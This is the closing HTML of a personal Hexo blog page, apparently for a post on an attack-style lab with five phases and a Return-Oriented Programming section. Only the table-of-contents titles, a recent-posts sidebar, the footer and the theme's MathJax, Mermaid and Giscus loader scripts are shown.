class="toc-item toc-level-1"><a class="toc-link" href="#Phase-1"><span class="toc-number">2.</span> <span class="toc-text">Phase_1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Phase-2"><span class="toc-number">3.</span> <span class="toc-text">Phase_2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Phase-3"><span class="toc-number">4.</span> <span class="toc-text">Phase_3</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Return-Oriented-Programming-%E6%A6%82%E5%BF%B5%E8%A3%9C%E5%85%85"><span class="toc-number">5.</span> <span class="toc-text">Return-Oriented Programming 概念補充</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Phase-4"><span class="toc-number">6.</span> <span class="toc-text">Phase_4</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Phase-5"><span class="toc-number">7.</span> <span class="toc-text">Phase_5</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BE%8C%E8%A8%98"><span class="toc-number">8.</span> <span class="toc-text">後記</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/12/20/GAMES-101-Transformation-%E7%AD%86%E8%A8%98/" title="[GAMES 101] Transformation 筆記"><img src="/pictures/%E6%88%91%E7%9A%84%E7%B4%99%E7%89%87%E4%BA%BA%E5%A5%B3%E5%8F%8B.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="[GAMES 101] Transformation 筆記"/></a><div class="content"><a class="title" href="/2025/12/20/GAMES-101-Transformation-%E7%AD%86%E8%A8%98/" title="[GAMES 101] Transformation 筆記">[GAMES 101] Transformation 筆記</a><time datetime="2025-12-20T14:04:40.382Z" title="更新于 2025-12-20 22:04:40">2025-12-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/09/14/Introduction-to-Computer-Network/" title="Introduction to Computer Network"><img src="/pictures/computer_network_intro.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Introduction to Computer Network"/></a><div class="content"><a class="title" href="/2025/09/14/Introduction-to-Computer-Network/" title="Introduction to Computer Network">Introduction to Computer Network</a><time datetime="2025-09-13T17:23:04.837Z" title="更新于 2025-09-14 01:23:04">2025-09-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/08/30/xv6-%E9%99%B7%E5%85%A5%E6%A9%9F%E5%88%B6%E6%B7%BA%E6%9E%90/" title="xv6 陷入機制淺析"><img src="/pictures/xv6_syscall.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="xv6 陷入機制淺析"/></a><div class="content"><a class="title" href="/2025/08/30/xv6-%E9%99%B7%E5%85%A5%E6%A9%9F%E5%88%B6%E6%B7%BA%E6%9E%90/" title="xv6 陷入機制淺析">xv6 陷入機制淺析</a><time datetime="2025-08-30T13:36:27.182Z" title="更新于 2025-08-30 21:36:27">2025-08-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/08/26/OSTEP-Virtualization/" title="OSTEP Virtualization"><img src="/pictures/OSTEP_Virtualization.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="OSTEP Virtualization"/></a><div class="content"><a class="title" href="/2025/08/26/OSTEP-Virtualization/" title="OSTEP Virtualization">OSTEP Virtualization</a><time datetime="2025-08-26T09:04:03.629Z" title="更新于 2025-08-26 17:04:03">2025-08-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/08/10/CSAPP-U10-%E6%A5%B5%E7%B0%A1%E7%AD%86%E8%A8%98/" title="CSAPP U10 極簡筆記"><img src="/pictures/CSAPP_U10.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CSAPP U10 極簡筆記"/></a><div class="content"><a class="title" href="/2025/08/10/CSAPP-U10-%E6%A5%B5%E7%B0%A1%E7%AD%86%E8%A8%98/" title="CSAPP U10 極簡筆記">CSAPP U10 極簡筆記</a><time datetime="2025-08-19T09:10:56.192Z" title="更新于 2025-08-19 17:10:56">2025-08-19</time></div></div></div></div></div></div></main><footer id="footer" style="background: linear-gradient(20deg, #0062be, #925696, #cc426e, #fb0347);"><div id="footer-wrap"><div class="copyright">&copy;2025 By asciibase64</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Have a good day, mate!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"><script>(() => {
+  const loadMathjax = () => {
+    if (!window.MathJax) {
+      window.MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']],
+          tags: 'none',
+        },
+        chtml: {
+          scale: 1.1
+        },
+        options: {
+          enableMenu: true,
+          renderActions: {
+            findScript: [10, doc => {
+              for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+                const display = !!node.type.match(/; *mode=display/)
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+                const text = document.createTextNode('')
+                node.parentNode.replaceChild(text, node)
+                math.start = {node: text, delim: '', n: 0}
+                math.end = {node: text, delim: '', n: 0}
+                doc.math.push(math)
+              }
+            }, '']
+          }
+        }
+      }
+
+      const script = document.createElement('script')
+      script.src = 'https://cdn.jsdelivr.net/npm/mathjax/es5/tex-mml-chtml.min.js'
+      script.id = 'MathJax-script'
+      script.async = true
+      document.head.appendChild(script)
+    } else {
+      MathJax.startup.document.state(0)
+      MathJax.texReset()
+      MathJax.typesetPromise()
+    }
+  }
+
+  btf.addGlobalFn('encrypt', loadMathjax, 'mathjax')
+  window.pjax ? loadMathjax() : window.addEventListener('load', loadMathjax)
+})()</script><script>(() => {
+  const runMermaid = ele => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    ele.forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+      const mermaidThemeConfig = `%%{init:{ 'theme':'${theme}'}}%%\n`
+      const mermaidID = `mermaid-${index}`
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+      const renderMermaid = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+      }
+
+      // mermaid v9 and v10 compatibility
+      typeof renderFn === 'string' ? renderMermaid(renderFn) : renderFn.then(({ svg }) => renderMermaid(svg))
+    })
+  }
+
+  const codeToMermaid = () => {
+    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
+    if (codeMermaidEle.length === 0) return
+
+    codeMermaidEle.forEach(ele => {
+      const preEle = document.createElement('pre')
+      preEle.className = 'mermaid-src'
+      preEle.hidden = true
+      preEle.textContent = ele.textContent
+      const newEle = document.createElement('div')
+      newEle.className = 'mermaid-wrap'
+      newEle.appendChild(preEle)
+      ele.parentNode.replaceWith(newEle)
+    })
+  }
+
+  const loadMermaid = () => {
+    if (true) codeToMermaid()
+    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+    if ($mermaid.length === 0) return
+
+    const runMermaidFn = () => runMermaid($mermaid)
+    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
+    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(runMermaidFn)
+  }
+
+  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = null
+
+  const getGiscusTheme = theme => theme === 'dark' ? 'dark' : 'light'
+
+  const createScriptElement = config => {
+    const ele = document.createElement('script')
+    Object.entries(config).forEach(([key, value]) => {
+      ele.setAttribute(key, value)
+    })
+    return ele
+  }
+
+  const loadGiscus = (el = document, key) => {
+    const mappingConfig = isShuoshuo
+      ? { 'data-mapping': 'specific', 'data-term': key }
+      : { 'data-mapping': (option && option['data-mapping']) || 'pathname' }
+
+    const giscusConfig = {
+      src: 'https://giscus.app/client.js',
+      'data-repo': 'ilsao/ilsao.github.io',
+      'data-repo-id': 'R_kgDONxqXQA',
+      'data-category-id': 'DIC_kwDONxqXQM4CmeG9',
+      'data-theme': getGiscusTheme(document.documentElement.getAttribute('data-theme')),
+      'data-reactions-enabled': '1',
+      crossorigin: 'anonymous',
+      async: true,
+      ...option,
+      ...mappingConfig
+    }
+
+    const scriptElement = createScriptElement(giscusConfig)
+
+    el.querySelector('#giscus-wrap').appendChild(scriptElement)
+
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyGiscus = () => {
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+  }
+
+  const changeGiscusTheme = theme => {
+    const iframe = document.querySelector('#giscus-wrap iframe')
+    if (iframe) {
+      const message = {
+        giscus: {
+          setConfig: {
+            theme: getGiscusTheme(theme)
+          }
+        }
+      }
+      iframe.contentWindow.postMessage(message, 'https://giscus.app')
+    }
+  }
+
+  btf.addGlobalFn('themeChange', changeGiscusTheme, 'giscus')
+
+  if (isShuoshuo) {
+    'Giscus' === 'Giscus'
+      ? window.shuoshuoComment = { loadComment: loadGiscus }
+      : window.loadOtherComment = loadGiscus
+    return
+  }
+
+  if ('Giscus' === 'Giscus' || !false) {
+    if (false) btf.loadComment(document.getElementById('giscus-wrap'), loadGiscus)
+    else loadGiscus()
+  } else {
+    window.loadOtherComment = loadGiscus
+  }
+})()</script></div><script async src="/js/title.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
